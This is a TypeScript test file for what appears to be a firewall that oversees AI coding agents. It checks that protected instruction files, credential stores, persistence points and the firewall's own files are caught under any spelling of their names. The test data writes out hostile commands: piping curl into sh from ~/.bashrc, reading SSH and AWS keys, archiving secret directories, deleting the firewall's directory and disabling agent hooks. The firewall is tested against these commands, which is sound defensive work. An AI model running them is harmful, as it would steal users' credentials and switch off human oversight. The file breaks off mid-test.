/**
 * Linux and WSL paths (portability audit items I1 and I7).
 *
 * I1: a Linux host cannot tell whether a directory folds case (WSL2 with the workspace on /mnt/c, an SMB or exFAT
 * mount, an ext4 directory marked case-insensitive), so the firewall's lists of dangerous places are matched
 * ignoring case on every platform (PROTECTION_FOLDS_CASE, src/engine/canonical.ts). Every context below is a
 * case-sensitive one (`caseInsensitive: false`, what Node reports on Linux); before this change a different spelling
 * of a protected name slipped past it. What grants trust (the workspace) keeps the platform's rule, and the controls
 * here show it.
 *
 * I7: the Linux credential stores and the Docker socket, and the Linux homes of Claude Desktop's and Cursor's
 * settings.
 *
 * Paths and commands are data; nothing is read or run.
 */
import { realpathSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { classifyPath, containsCredentialStores, CREDENTIAL_STORE_PATTERNS, resolvePath } from "../src/engine/paths.js";
import { defaultConfig } from "../src/policy.js";
import { insideFirewallHome } from "../src/logbundle/place.js";
import { insideRealHome } from "../src/real-home.js";
import { linkTargetProblem } from "../src/runtime/fsutil.js";
import { assertNotRealHome, RealHomeRefused } from "../src/runtime/guard.js";
import { layout } from "../src/runtime/layout.js";
import { purgeRefusal } from "../src/runtime/purge.js";
import { processBindingFor } from "../src/runtime/run/vault-env.js";
import type { Decision } from "../src/types.js";
import { sensitivePath } from "../src/ui/data.js";
import { bash, ctx, explain, HOME, run, tempHome, WS, type RunOpts } from "./helpers.js";

const LINUX: RunOpts = { ctx: { caseInsensitive: false } };
const lin = ctx({ caseInsensitive: false });
const cfg = defaultConfig();
const info = (p: string, c = lin) => classifyPath(resolvePath(p, c)!, c, cfg);

/** The verdicts that stop an action without a person: held, asked or denied. */
const NOT_ALLOWED = ["deny", "ask", "queue"];

describe("I1: protected files are matched ignoring case on a case-sensitive platform", () => {
  const SPELLINGS = [
    `${WS}/claude.md`,
    `${WS}/Claude.MD`,
    `${WS}/sub/agents.md`,
    `${WS}/.Claude/Settings.json`,
    `${WS}/.CURSOR/mcp.json`,
    `${WS}/.Mcp.json`,
    `${WS}/.GitHub/Copilot-Instructions.md`,
    `${HOME}/.Claude.json`,
    // Claude Desktop's Linux home is ~/.config/Claude: both the real spelling and the lower-case alias are protected.
    `${HOME}/.config/Claude/claude_desktop_config.json`,
    `${HOME}/.config/claude/claude_desktop_config.json`,
    `${HOME}/.CONFIG/CLAUDE/claude_desktop_config.json`,
  ];
  it.each(SPELLINGS)("%s is protected", (p) => expect(info(p).protected).toBe(true));

  it("names that only look similar stay ordinary files", () => {
    for (const p of [`${WS}/src/claude-notes.ts`, `${WS}/README.md`, `${WS}/docs/Guide.md`, `${WS}/.claudeignore`, `${HOME}/.config/Claudette/x.json`]) expect(info(p).protected, p).toBe(false);
  });

  it("a glob names the protected file it could match, whatever its case", () => {
    expect(info(`${WS}/claude.*`).protected).toBe(true);
    expect(info(`${WS}/agents.*`).protected).toBe(true);
    expect(info(`${WS}/notes.*`).protected).toBe(false);
  });

  it("a write after outside content is held for a person under any spelling", () => {
    for (const p of [`${WS}/claude.md`, `${WS}/.Claude/Notes.md`, `${HOME}/.config/Claude/claude_desktop_config.json`]) {
      const d = run("Write", { file_path: p, content: "x" }, { ...LINUX, tainted: true });
      expect(NOT_ALLOWED, `${p}: ${explain(d)}`).toContain(d.verdict);
      expect(d.rules, `${p}: ${explain(d)}`).toContain("FW-INSTRUCTIONS-HELD");
    }
    const sh = bash("cat evil > claude.md", { ...LINUX, tainted: true });
    expect(NOT_ALLOWED, explain(sh)).toContain(sh.verdict);
  });

  it("a file an instruction file imports is protected under any spelling of its name", () => {
    const imports = { caseInsensitive: false, readFile: (p: string) => (p === `${WS}/CLAUDE.md` ? "Style rules: @docs/Rules.md\n" : null) };
    for (const p of [`${WS}/docs/Rules.md`, `${WS}/docs/rules.md`, `${WS}/Docs/RULES.MD`]) {
      const d = run("Write", { file_path: p, content: "x" }, { tainted: true, ctx: imports });
      expect(d.rules, `${p}: ${explain(d)}`).toContain("FW-INSTRUCTIONS-HELD");
    }
    const other = run("Write", { file_path: `${WS}/docs/other.md`, content: "x" }, { tainted: true, ctx: imports });
    expect(other.verdict, explain(other)).toBe("allow");
  });

  it("the cost: a look-alike that is a separate file on a case-sensitive disk is held after outside content, not blocked", () => {
    const d = run("Write", { file_path: `${WS}/docs/agents.md`, content: "x" }, { ...LINUX, tainted: true });
    expect(d.verdict, explain(d)).toBe("queue");
    // In a session that has read nothing outside, instruction files stay editable (policy allowInstructionWritesWhenTrusted).
    expect(run("Write", { file_path: `${WS}/docs/agents.md`, content: "x" }, LINUX).verdict).toBe("allow");
  });
});

describe("I1: persistence points are matched ignoring case", () => {
  const POINTS: [string, string | undefined][] = [
    [`${WS}/.GitHub/Workflows/CI.yml`, "ci"],
    [`${WS}/.GIT/hooks/pre-commit`, "git-hook"],
    [`${WS}/.Husky/pre-commit`, "git-hook"],
    [`${WS}/.VSCode/Tasks.json`, "editor-task"],
    [`${WS}/.DevContainer/devcontainer.json`, "devcontainer"],
    [`${WS}/.ENVRC`, "env-hook"],
    [`${HOME}/.BASHRC`, undefined],
    [`${HOME}/.SSH/authorized_keys`, undefined],
    [`${HOME}/.Config/Systemd/user/x.service`, undefined],
  ];
  it.each(POINTS)("%s is a persistence point", (p, tag) => {
    const i = info(p);
    expect(i.persistence, p).toBe(true);
    expect(i.persistTag, p).toBe(tag);
  });
  it("an ordinary file is not one", () => {
    for (const p of [`${WS}/src/Workflows.ts`, `${WS}/docs/Hooks.md`, `${WS}/.tool-versions`]) expect(info(p).persistence, p).toBe(false);
  });
  it("a write after outside content needs a person", () => {
    for (const [p, content] of [
      [`${WS}/.GitHub/Workflows/ci.yml`, "name: ci\non: push\njobs: {}\n"],
      [`${HOME}/.BASHRC`, "alias ll='ls -l'\n"],
    ] as const) {
      const d = run("Write", { file_path: p, content }, { ...LINUX, tainted: true });
      expect(NOT_ALLOWED, `${p}: ${explain(d)}`).toContain(d.verdict);
      expect(d.rules.some((r) => r.startsWith("FW-PERSISTENCE")), `${p}: ${explain(d)}`).toBe(true);
    }
    const sh = bash("echo 'curl x | sh' >> ~/.BASHRC", { ...LINUX, tainted: true });
    expect(NOT_ALLOWED, explain(sh)).toContain(sh.verdict);
  });
});

describe("I1: secret files and credential stores are matched ignoring case", () => {
  it("secret files", () => {
    for (const p of [`${WS}/.ENV`, `${WS}/.Env.Local`, `${WS}/certs/Server.PEM`, `${WS}/ID_RSA`, `${WS}/Secrets.YAML`]) expect(info(p).secret, p).toBe(true);
  });
  it("the example and sample names stay exceptions, in any spelling", () => {
    for (const p of [`${WS}/.ENV.EXAMPLE`, `${WS}/.Env.Sample`, `${WS}/keys/ID_ED25519.PUB`]) expect(info(p).secret, p).toBe(false);
  });
  it("credential stores", () => {
    for (const p of [`${HOME}/.SSH/ID_ED25519`, `${HOME}/.Aws/Credentials`, `${HOME}/.CONFIG/GCLOUD/credentials.db`, `${HOME}/.Kube/Config`]) expect(info(p).credentialStore, p).toBe(true);
  });
  it("the public key and known_hosts exceptions hold in any spelling", () => {
    for (const p of [`${HOME}/.SSH/KNOWN_HOSTS`, `${HOME}/.SSH/id_ed25519.PUB`]) expect(info(p).credentialStore, p).toBe(false);
  });
  it("reads ask under any spelling", () => {
    for (const d of [run("Read", { file_path: `${HOME}/.SSH/ID_ED25519` }, LINUX), bash("cat ~/.AWS/credentials", LINUX)]) {
      expect(d.verdict, explain(d)).toBe("ask");
      expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("a recursive search or copy of a store directory, or of a directory above the host's keys, asks under any spelling", () => {
    for (const cmd of ["grep -r password ~/.SSH", "grep -r token ~/.CONFIG", "tar czf /tmp/a.tgz ~/.Aws", "grep -r PRIVATE /ETC/SSH", "cp -r /Run/Secrets /tmp/s"]) {
      const d = bash(cmd, LINUX);
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${cmd}: ${explain(d)}`).toContain("FW-CREDENTIAL-READ");
    }
  });
});

describe("I1: the firewall's own directory and settings files are matched ignoring case", () => {
  it("the data directory", () => {
    const keys = info(`${HOME}/.LaunchSafe-Firewall/keys/approval.key`);
    expect(keys.firewall).toBe(true);
    expect(keys.firewallData).toBe("key");
    expect(info(`${HOME}/.LAUNCHSAFE-FIREWALL/policy.json`).firewallData).toBe("data");
    const elsewhere = ctx({ caseInsensitive: false, firewallHome: "/srv/FW-Home" });
    expect(info("/srv/fw-home/vault/index.json", elsewhere).firewallData).toBe("key");
  });
  it("a write is tampering", () => {
    const d = run("Write", { file_path: `${HOME}/.Launchsafe-Firewall/policy.json`, content: "{}" }, LINUX);
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
    const sh = bash("rm -rf ~/.LAUNCHSAFE-FIREWALL", LINUX);
    expect(sh.verdict, explain(sh)).toBe("deny");
  });
  it("the package the firewall is installed from", () => {
    const d = run("Write", { file_path: "/opt/Launchsafe-Firewall/dist/CLI.js", content: "x" }, LINUX);
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
  });
  it("an agent's hook settings file known by its location", () => {
    const p = `${HOME}/.config/codex/config.toml`;
    const c = { caseInsensitive: false, agentSettings: [p] };
    const w = run("Write", { file_path: `${HOME}/.config/Codex/Config.toml`, content: "[features]\nhooks = false\n" }, { ctx: c });
    expect(w.verdict, explain(w)).toBe("deny");
    expect(w.rules, explain(w)).toContain("FW-TAMPER");
    const sh = bash(`echo 'hooks = false' > ${HOME}/.config/Codex/CONFIG.TOML`, { ctx: c });
    expect(sh.verdict, explain(sh)).toBe("deny");
    expect(sh.rules, explain(sh)).toContain("FW-TAMPER");
  });
  it("an MCP client configuration the gateway wrapped", () => {
    const path = `${HOME}/.config/Claude/claude_desktop_config.json`;
    const c = { caseInsensitive: false, gatewayConfigs: [{ path, wrapped: {} }], readFile: () => null };
    const d = bash(`echo '{}' > ${HOME}/.config/claude/CLAUDE_DESKTOP_CONFIG.JSON`, { ctx: c });
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
  });
  it("a wrapped MCP client configuration written with the Write tool under another spelling is judged by its result", () => {
    const path = `${HOME}/.config/Claude/claude_desktop_config.json`;
    const c = { caseInsensitive: false, gatewayConfigs: [{ path, wrapped: { [JSON.stringify(["mcpServers", "files"])]: "0" } }], readFile: () => null };
    const content = JSON.stringify({ mcpServers: {} });
    const d = run("Write", { file_path: `${HOME}/.config/claude/CLAUDE_DESKTOP_CONFIG.JSON`, content }, { ctx: c });
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
    // Control: another file in the same directory is a settings change a person approves, not tampering.
    const other = run("Write", { file_path: `${HOME}/.config/Claude/other_config.json`, content }, { ctx: c });
    expect(other.rules, explain(other)).not.toContain("FW-TAMPER");
  });
  it("removing the directory that holds a wrapped configuration, spelled another way, is tampering", () => {
    const c = { caseInsensitive: false, gatewayConfigs: [{ path: `${HOME}/.config/Claude/claude_desktop_config.json`, wrapped: {} }], readFile: () => null };
    const d = bash(`rm -rf ${HOME}/.config/claude`, { ctx: c });
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
  });
  it("an edit of a registered settings file that cannot be read, under another spelling, assumes the worst", () => {
    const registered = { caseInsensitive: false, registeredSettings: [`${WS}/.claude/settings.json`] };
    const d = run("Edit", { file_path: `${WS}/.Claude/Settings.json`, old_string: "a", new_string: "b" }, { ctx: registered });
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
    // Control: without the registration the same edit is a settings change a person approves.
    const plain = run("Edit", { file_path: `${WS}/.Claude/Settings.json`, old_string: "a", new_string: "b" }, LINUX);
    expect(plain.verdict, explain(plain)).toBe("ask");
    expect(plain.rules, explain(plain)).not.toContain("FW-TAMPER");
  });
  it("removing a registered settings file under another spelling is tampering", () => {
    const d = bash(`rm ${WS}/.Claude/settings.json`, { ctx: { caseInsensitive: false, registeredSettings: [`${WS}/.claude/settings.json`] } });
    expect(d.verdict, explain(d)).toBe("deny");
    expect(d.rules, explain(d)).toContain("FW-TAMPER");
    // Control: a settings file the firewall did not register (and cannot read) is asked, not refused.
    const plain = bash(`rm ${WS}/.Claude/settings.json`, LINUX);
    expect(plain.rules, explain(plain)).not.toContain("FW-TAMPER");
  });
});

describe("I1: folding case only adds questions; what is outside content keeps the platform's rule", () => {
  const O = `${HOME}/other`;
  const taints = (d: Decision): boolean => d.events.some((e) => e.type === "taint");
  // Names that only fold to an instruction, memory or settings file's: on a case-sensitive disk each is another file,
  // which may be someone else's (a cloned repository, a shared directory). Reading one made the session untrusted
  // before the lists folded case, and still does.
  const LOOK_ALIKES = [`${O}/agents.md`, `${O}/memory.md`, `${O}/claude.md`, `${O}/.Claude/settings.json`];

  it.each(LOOK_ALIKES)("reading %s still makes the session untrusted", (p) => {
    for (const d of [run("Read", { file_path: p }, LINUX), bash(`cat ${p}`, LINUX)]) {
      expect(d.verdict, explain(d)).toBe("allow");
      expect(taints(d), explain(d)).toBe(true);
      expect(d.effects.some((e) => e.cls === "read_external" && e.taints === true), explain(d)).toBe(true);
    }
  });
  it("a glob read whose pattern only folds to an instruction file's name taints too", () => {
    const d = bash(`cat ${O}/agents.*`, LINUX);
    expect(taints(d), explain(d)).toBe(true);
  });
  it("Claude Desktop's Linux directory is ~/.config/Claude; reading the lower-case one, another directory there, taints", () => {
    const d = run("Read", { file_path: `${HOME}/.config/claude/claude_desktop_config.json` }, LINUX);
    expect(taints(d), explain(d)).toBe(true);
  });
  it("and a write to one is still held after outside content (the fold's question stays)", () => {
    for (const p of LOOK_ALIKES) {
      const d = run("Write", { file_path: p, content: "x" }, { ...LINUX, tainted: true });
      expect(d.rules, `${p}: ${explain(d)}`).toContain("FW-INSTRUCTIONS-HELD");
    }
  });
  it("listing a directory whose name only folds to a protected one taints, with LS, Glob and ls", () => {
    for (const d of [run("LS", { path: `${O}/.Claude` }, LINUX), run("Glob", { pattern: "*.json", path: `${O}/.Claude` }, LINUX), bash(`ls ${O}/.Claude`, LINUX)]) {
      expect(taints(d), explain(d)).toBe(true);
    }
  });
  it("ls of a file that only folds to a credential store's name keeps the taint (it is recorded first)", () => {
    const d = bash("ls -l ~/.AWS/config", LINUX);
    expect(taints(d), explain(d)).toBe(true);
    // Control: listing the store as spelled shows names, not content.
    const own = bash("ls -l ~/.aws/config", LINUX);
    expect(taints(own), explain(own)).toBe(false);
  });
  it("the installed firewall's files under another spelling are other files: reading one taints", () => {
    const d = run("Read", { file_path: "/opt/Launchsafe-Firewall/dist/hook.js" }, LINUX);
    expect(taints(d), explain(d)).toBe(true);
  });
  it("a program that only folds to the installed CLI is not let through as the firewall's own read-only command", () => {
    for (const cmd of ["node /opt/Launchsafe-Firewall/dist/cli.js status", "/opt/Launchsafe-Firewall/dist/cli.js status", "node /opt/LAUNCHSAFE-FIREWALL/dist/hook.js"]) {
      const d = bash(cmd, LINUX);
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${cmd}: ${explain(d)}`).toContain("FW-UNTRUSTED-CODE");
    }
    // Controls: the CLI as installed runs; a changing command is refused under any spelling; on a disk that folds case
    // the other spelling is the CLI itself.
    const own = bash("node /opt/launchsafe-firewall/dist/cli.js status", LINUX);
    expect(own.verdict, explain(own)).toBe("allow");
    const change = bash("node /opt/Launchsafe-Firewall/dist/cli.js uninstall", LINUX);
    expect(change.verdict, explain(change)).toBe("deny");
    expect(change.rules, explain(change)).toContain("FW-TAMPER");
    const folding = bash("node /opt/Launchsafe-Firewall/dist/cli.js status", { ctx: { caseInsensitive: true } });
    expect(folding.verdict, explain(folding)).toBe("allow");
  });
  // (~/.AWS/credentials is not here: its name alone makes it a secret outside the workspace, which asks without a taint.)
  it("a look-alike of a credential store or a secret asks, and taints as it did before", () => {
    const reads = [bash("cat ~/.AWS/config", LINUX), run("Read", { file_path: `${O}/.ENV` }, LINUX), bash("grep -r password ~/.SSH", LINUX), run("Read", { file_path: `${HOME}/.LAUNCHSAFE-FIREWALL/policy.json` }, LINUX)];
    for (const d of reads) {
      expect(d.verdict, explain(d)).toBe("ask");
      expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
      expect(taints(d), explain(d)).toBe(true);
    }
  });
  it("I7: a glob or a recursive read that only folds to a store's place asks, and taints as outside content", () => {
    for (const cmd of ["cat /ETC/SSH/ssh_host_*", "cat /etc/ssh/SSH_HOST_*_KEY", "cat /Etc/ss*/ssh_host_rsa_key", "grep -r PRIVATE /ETC/SSH", "grep -r PRIVATE /Etc"]) {
      const d = bash(cmd, LINUX);
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${cmd}: ${explain(d)}`).toContain("FW-CREDENTIAL-READ");
      expect(taints(d), `${cmd}: ${explain(d)}`).toBe(true);
    }
  });
  it("I7 controls: the same globs and recursive reads as spelled ask without a taint", () => {
    for (const cmd of ["cat /etc/ssh/ssh_host_*", "cat /etc/ss*/ssh_host_rsa_key", "grep -r PRIVATE /etc/ssh", "grep -r PRIVATE /etc", "grep -r password /run"]) {
      const d = bash(cmd, LINUX);
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("ask");
      expect(taints(d), `${cmd}: ${explain(d)}`).toBe(false);
    }
  });
  it("controls: the agent's own settings, the firewall's files and a credential store as spelled do not taint", () => {
    const reads = [
      run("Read", { file_path: `${HOME}/.claude/settings.json` }, LINUX),
      run("Read", { file_path: `${HOME}/.config/Claude/claude_desktop_config.json` }, LINUX),
      run("Read", { file_path: "/opt/launchsafe-firewall/dist/hook.js" }, LINUX),
      run("LS", { path: `${HOME}/.claude` }, LINUX),
      bash(`ls ${HOME}/.claude`, LINUX),
      bash("cat ~/.aws/credentials", LINUX),
      bash("grep -r password ~/.ssh", LINUX),
    ];
    for (const d of reads) expect(taints(d), explain(d)).toBe(false);
  });
  it("controls: on a case-insensitive disk another spelling is the same file, so it does not taint either", () => {
    const MAC: RunOpts = { ctx: { caseInsensitive: true } };
    for (const d of [run("Read", { file_path: `${HOME}/.Claude/settings.json` }, MAC), run("LS", { path: `${HOME}/.CLAUDE` }, MAC), run("Read", { file_path: "/opt/Launchsafe-Firewall/dist/hook.js" }, MAC)]) {
      expect(taints(d), explain(d)).toBe(false);
    }
  });
  it("a protected file written with a credential is a secret file, as an ordinary write would make it", () => {
    const p = `${O}/agents.md`;
    const w = run("Write", { file_path: p, content: "aws_access_key_id = AKIA1A2B3C4D5E6F7G8H\n" }, LINUX);
    expect(["allow", "ask"], explain(w)).toContain(w.verdict);
    expect(w.events, explain(w)).toContainEqual({ type: "secret_path", path: p });
    const sh = bash(`cat ~/.aws/credentials > ${p}`, LINUX);
    expect(["allow", "ask"], explain(sh)).toContain(sh.verdict);
    expect(sh.events, explain(sh)).toContainEqual({ type: "secret_path", path: p });
  });
  it("a look-alike written after outside content is recorded as such once a person approves the proposal", () => {
    const p = `${O}/agents.md`;
    const input = { file_path: p, content: "x" };
    const held = run("Write", input, { ...LINUX, tainted: true });
    expect(held.rules, explain(held)).toContain("FW-INSTRUCTIONS-HELD");
    const approved = run("Write", input, { ...LINUX, tainted: true, events: [{ type: "approval", actionHash: held.actionHash, id: "q1", proposal: true }] });
    expect(approved.verdict, explain(approved)).toBe("allow");
    expect(approved.events, explain(approved)).toContainEqual({ type: "tainted_write", path: p });
  });
});

describe("I1: what grants trust keeps the platform's rule", () => {
  it("a sibling of the workspace that differs only in case is outside it on a case-sensitive disk", () => {
    const sibling = "/Users/dev/PROJ/x.txt";
    const linux = bash(`cat evil > ${sibling}`, { tainted: true, ctx: { caseInsensitive: false } });
    expect(linux.verdict, explain(linux)).not.toBe("allow");
    expect(linux.rules, explain(linux)).toContain("FW-OUTSIDE-WRITE");
    // The same path on a case-insensitive disk is the workspace itself.
    const mac = bash(`cat evil > ${sibling}`, { tainted: true, ctx: { caseInsensitive: true } });
    expect(mac.verdict, explain(mac)).toBe("allow");
  });
  it("the workspace zone is unchanged by the fold", () => {
    expect(info(`${WS}/src/a.ts`).zone).toBe("workspace");
    expect(info("/Users/dev/PROJ/src/a.ts").zone).toBe("outside");
    expect(info("/Users/dev/PROJ/src/a.ts", ctx({ caseInsensitive: true })).zone).toBe("workspace");
  });
});

describe("I1: the runtime guards refuse a different spelling of the places they keep out", () => {
  it("a settings symlink is not written through into a credential store, the firewall's directory or another agent's configuration", () => {
    const home = realpathSync(tempHome("i1-"));
    const env = { ...process.env, LAUNCHSAFE_FIREWALL_HOME: join(home, ".launchsafe-firewall"), CLAUDE_CONFIG_DIR: "", CODEX_HOME: "", GEMINI_CLI_HOME: "" };
    const o = { home, env };
    const link = join(home, ".claude", "settings.json");
    expect(linkTargetProblem(link, join(home, ".SSH", "id_ed25519"), o)).toMatch(/credential store/);
    expect(linkTargetProblem(link, join(home, ".Gnupg", "x"), o)).toMatch(/credential store/);
    expect(linkTargetProblem(link, join(home, ".LaunchSafe-Firewall", "policy.json"), o)).toMatch(/firewall's own directory/);
    expect(linkTargetProblem(link, join(home, ".GEMINI", "settings.json"), o)).toMatch(/another agent's configuration \(gemini\)/);
    // Controls: a dotfiles repository and the agent's own directory are fine.
    expect(linkTargetProblem(link, join(home, "dotfiles", "claude", "settings.json"), o)).toBeNull();
    expect(linkTargetProblem(link, join(home, ".claude", "shared.json"), o)).toBeNull();
  });
  // Where trust is granted the platform's rule stands: on a case-sensitive disk another spelling of the home directory is not the home.
  it.skipIf(process.platform === "darwin" || process.platform === "win32")("a target outside the home directory stays outside when only the case of the home differs", () => {
    const home = realpathSync(tempHome("i1-"));
    const env = { ...process.env, LAUNCHSAFE_FIREWALL_HOME: join(home, ".launchsafe-firewall"), CLAUDE_CONFIG_DIR: "", CODEX_HOME: "", GEMINI_CLI_HOME: "" };
    const link = join(home, ".claude", "settings.json");
    expect(linkTargetProblem(link, join(home, "dotfiles", "x.json"), { home, env })).toBeNull();
    expect(linkTargetProblem(link, join(home, "dotfiles", "x.json"), { home: home.toUpperCase(), env })).toMatch(/outside your home/);
  });
  it("the compile cache is not made in a home spelled another way", () => {
    expect(insideRealHome("/ZZ-no-such-home/ALICE/.launchsafe-firewall", "/zz-no-such-home/Alice")).toBe(true);
    expect(insideRealHome("/zz-no-such-home/Alice", "/zz-no-such-home/alice")).toBe(true);
    expect(insideRealHome("/zz-no-such-home/Alice2/x", "/zz-no-such-home/alice")).toBe(false);
    expect(insideRealHome("/zz-no-such-other/alice/x", "/zz-no-such-home/alice")).toBe(false);
  });
  it("a test cannot write the real home under another spelling", () => {
    const deps = { userInfo: () => ({ homedir: "/zz-no-such-home/alice" }) };
    expect(() => assertNotRealHome("/ZZ-NO-SUCH-HOME/Alice/.claude/settings.json", { LAUNCHSAFE_FIREWALL_TEST: "1" }, deps)).toThrow(RealHomeRefused);
    // Controls: the exact spelling is refused too, and a place that is not the home is not.
    expect(() => assertNotRealHome("/zz-no-such-home/alice/.claude/settings.json", { LAUNCHSAFE_FIREWALL_TEST: "1" }, deps)).toThrow(RealHomeRefused);
    expect(() => assertNotRealHome("/zz-no-such-other/alice/x", { LAUNCHSAFE_FIREWALL_TEST: "1" }, deps)).not.toThrow();
  });
  it("purge refuses a directory that is the home or the working directory under another spelling", () => {
    const o = { cwd: "/zz-no-such-work/Proj", home: "/zz-no-such-home/Alice", passwdHome: "/zz-no-such-passwd" };
    expect(purgeRefusal(layout("/ZZ-NO-SUCH-HOME/alice"), o)).toMatch(/home directory or contains one/);
    expect(purgeRefusal(layout("/zz-no-such-work/proj"), o)).toMatch(/working directory/);
    // A directory that is neither is judged on its own (it does not exist here).
    expect(purgeRefusal(layout("/zz-no-such-other/fw"), o)).toMatch(/does not exist/);
  });
  it("an export is not placed inside the firewall's directory under another spelling", () => {
    const l = layout("/zz-no-such-fw/Home");
    expect(insideFirewallHome(l, "/ZZ-NO-SUCH-FW/HOME/export.json")).toBe(true);
    expect(insideFirewallHome(l, "/zz-no-such-fw/other/export.json")).toBe(false);
  });
  it("a vault binding is not honoured for a program that could be inside the workspace under another spelling", () => {
    expect(processBindingFor(["gh", "*"], { argv: ["gh", "api"], program: "/usr/bin/gh", workspace: "/w" })).toBe(true);
    expect(processBindingFor(["gh", "*"], { argv: ["gh", "api"], program: "/W/node_modules/.bin/gh", workspace: "/w" })).toBe(false);
  });
  it("the dashboard does not show a secret or credential store under another spelling", () => {
    expect(sensitivePath("/H/.SSH/ID_ED25519", ["/h"])).toBe(true);
    expect(sensitivePath("/w/.ENV", ["/h"])).toBe(true);
    expect(sensitivePath("/h/.SSH/KNOWN_HOSTS", ["/h"])).toBe(false);
    expect(sensitivePath("/w/README.md", ["/h"])).toBe(false);
  });
});

describe("I7: the Linux credential stores and the Docker socket are credential stores", () => {
  const STORES = [
    `${HOME}/.local/share/keyrings/login.keyring`,
    `${HOME}/.local/share/keyrings/default`,
    `${HOME}/.local/share/kwalletd/kdewallet.kwl`,
    "/etc/ssh/ssh_host_ed25519_key",
    "/etc/ssh/ssh_host_rsa_key",
    "/run/secrets/db_password",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/docker.sock",
    "/run/docker.sock",
  ];
  it("the patterns are on the list", () => {
    for (const p of ["~/.local/share/keyrings/**", "~/.local/share/kwalletd/**", "/etc/ssh/ssh_host_*_key", "/run/secrets/**", "/var/run/docker.sock", "/run/docker.sock"]) expect(CREDENTIAL_STORE_PATTERNS, p).toContain(p);
  });
  // The same place spelled in capitals (I1), keeping the home directory as the context knows it.
  const shout = (p: string): string => (p.startsWith(`${HOME}/`) ? HOME + p.slice(HOME.length).toUpperCase() : p.toUpperCase());
  it.each(STORES)("%s is a credential store", (p) => {
    expect(info(p).credentialStore).toBe(true);
    expect(info(shout(p)).credentialStore, shout(p)).toBe(true);
  });
  it.each(STORES)("reading %s asks, with the Read tool and the shell, on a case-sensitive platform", (p) => {
    for (const d of [run("Read", { file_path: p }, LINUX), bash(`cat '${p}'`, LINUX)]) {
      expect(d.verdict, explain(d)).toBe("ask");
      expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("a recursive search of a directory of them asks too", () => {
    for (const dir of ["/run/secrets", "/var/run/secrets", `${HOME}/.local/share/keyrings`, `${HOME}/.local/share/kwalletd`]) {
      const d = bash(`grep -r password ${dir}`, LINUX);
      expect(d.verdict, `${dir}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${dir}: ${explain(d)}`).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("controls: the host's public keys and its other SSH files are not credential stores", () => {
    for (const p of ["/etc/ssh/ssh_host_ed25519_key.pub", "/etc/ssh/sshd_config", "/etc/ssh/ssh_config", `${HOME}/.local/share/applications/x.desktop`, `${HOME}/.local/share/keyringsfoo/x`, "/run/secretsfoo/x", "/run/docker.sock.bak"]) {
      expect(info(p).credentialStore, p).toBe(false);
      expect(run("Read", { file_path: p }, LINUX).rules, p).not.toContain("FW-CREDENTIAL-READ");
    }
  });
  it("the Docker API socket stays a privilege request when a program is pointed at it", () => {
    const d = bash("curl --unix-socket /var/run/docker.sock -X POST -d @c.json http://localhost/containers/create", LINUX);
    expect(d.verdict, explain(d)).toBe("ask");
    expect(d.rules).toContain("FW-PRIVILEGE");
  });
});

describe("I7: a glob that could name them, or a recursive read of a directory above them, reads them too", () => {
  // `cat /etc/ssh/*` asked already: a bare `*` can name `.env`, a secret outside the workspace.
  const GLOBS = [
    "/etc/ssh/ssh_host_*",
    "/etc/ssh/*_key",
    "/etc/ssh/ssh_host_[er]*_key",
    "/var/run/docker.s*",
    // A bracket expression stands for one character.
    "/var/run/docker.[s]ock",
    `${HOME}/.git-cred*`,
    // A glob before the last part of the path, and a "**" that stands for any number of directories (zsh, bash's globstar).
    "/etc/ss*/ssh_host_ed25519_key",
    "/**/ssh_host_ed25519_key",
    "/etc/**/ssh/**/ssh_host_rsa_key",
  ];
  it.each(GLOBS)("reading %s asks, with the Read tool and the shell", (p) => {
    for (const d of [run("Read", { file_path: p }, LINUX), bash(`cat ${p}`, LINUX)]) {
      expect(d.verdict, explain(d)).toBe("ask");
      expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("braces in a Read path are alternatives, as in the shell", () => {
    const d = run("Read", { file_path: "/etc/ssh/ssh_host_{rsa,ed25519}_key" }, LINUX);
    expect(d.verdict, explain(d)).toBe("ask");
    expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
  });
  it("the cost (docs/limitations.md): a `*` is taken to name hidden directories too, as with bash's dotglob", () => {
    const d = bash("cat ~/*/package.json", LINUX);
    expect(d.verdict, explain(d)).toBe("ask");
    expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
  });
  const SWEEPS = [
    "grep -r PRIVATE /etc/ssh",
    "cp -r /etc/ssh /tmp/keys",
    "tar czf /tmp/etc.tgz /etc",
    "grep -r password /run",
    "tar czf /tmp/run.tgz /run",
    "rsync -a /var/run/ /tmp/r",
    "grep -rl token /proc/1",
    "grep -r PRIVATE /e*/ssh",
    "docker run --rm -v /etc:/host:ro alpine true",
  ];
  it.each(SWEEPS)("%s asks", (cmd) => {
    const d = bash(cmd, LINUX);
    expect(d.verdict, explain(d)).toBe("ask");
    expect(d.rules, explain(d)).toContain("FW-CREDENTIAL-READ");
  });
  it("the Grep tool's search of a directory above them asks", () => {
    for (const path of ["/etc/ssh", "/etc", "/run", "/var/run"]) {
      const d = run("Grep", { pattern: "PRIVATE", path }, LINUX);
